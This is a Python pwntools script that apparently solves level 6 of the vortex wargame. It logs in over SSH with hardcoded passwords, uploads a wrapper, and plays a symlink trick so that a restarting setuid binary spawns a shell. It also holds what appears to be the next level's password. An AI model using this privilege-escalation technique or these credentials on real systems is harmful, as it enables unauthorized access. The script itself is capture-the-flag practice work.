from pwn import *
from pwnhelper import *


local_dir = None
remote_binary = None
local_binary = None
local_libc = None
libc = None
port = None
elf = None

BINARY_PATH = None
CWD = None
VM = None


def connect(level, password):
    global remote_binary
    global local_dir
    global local_binary
    global port
    global libc
    global elf
    global CWD
    global BINARY_PATH
    global VM
    compose_downloaded_files(level)
    port = 2228
    s = ssh("vortex"+level, "176.9.9.172", password=password, cache=True, port=port)
    s.libs(remote_binary, local_dir)
    log.info(f"cloned_binary: {local_binary}")
    elf = ELF(local_binary)
    libc = ELF(local_libc)
    VM = False
    CWD = "/tmp/"
    BINARY_PATH = "/vortex/vortex"+level
    return s


# function of local testing vm
def connect_to_vm(level, password, remote=True):
    global CWD
    global VM
    global BINARY_PATH
    global ALIGNMENT_OFF
    if remote:
        connect(level, password)
    else:
        compose_downloaded_files(level)
    context.clear()
    context.binary = local_binary
    context.log_file = "/tmp/docgillog"
    s = ssh("gil", "192.168.2.177", password="gil123", cache=True)
    CWD = "/vortex/6/"
    BINARY_PATH = "/vortex/vortex" + level
    # BINARY_PATH = "/vortex/6/dir/vortex6"
    # BINARY_PATH = "dir/vortex6"
    s.upload(local_binary, BINARY_PATH)
    VM = True
    return s
    # only useful to replace libc, if we need gadgets from it, then upload and use LD_PRELOAD
    # s.upload(local_libc, "/lib/x86_64-linux-gnu/libc.so.6")


def compose_downloaded_files(level):
    global remote_binary
    global local_dir
    global local_binary
    global port
    global libc
    global elf
    global local_libc
    local_dir = "/home/kali/PycharmProjects/vortex/" + level
    remote_binary = "/vortex/vortex" + level
    local_binary = local_dir + remote_binary
    local_libc = local_dir + "/lib32/libc.so.6"


# s = connect_to_vm("6", "*uy5qDRb2", remote=False)
s = connect("6", "*uy5qDRb2")

s.upload("./6/vortex-wrapper.o", CWD + "vortex-wrapper.o")

rm = s.process(["rm", "-rf", "sh"], cwd=CWD)
rm.recvall()
io = s.process(["ln", "-s", BINARY_PATH, "sh"], cwd=CWD)
io.recvall()


io = s.process(["chmod", "a+x", "vortex-wrapper.o"], cwd=CWD)
io.recvall()
if VM:
    io = s.process(["chmod", "a+x", BINARY_PATH], cwd=CWD)
    io.recvall()
io = s.process(["vortex-wrapper.o", "sh"], cwd=CWD)
# io = s.process("./vortex-wrapper.o sh", shell=True, cwd=CWD)

time.sleep(5)
# remove symlink, so now restart searches path for sh and starts shell
rm = s.process(["rm", "sh"], cwd=CWD)
rm.recvall()

io.interactive()


# Y52jxHtt/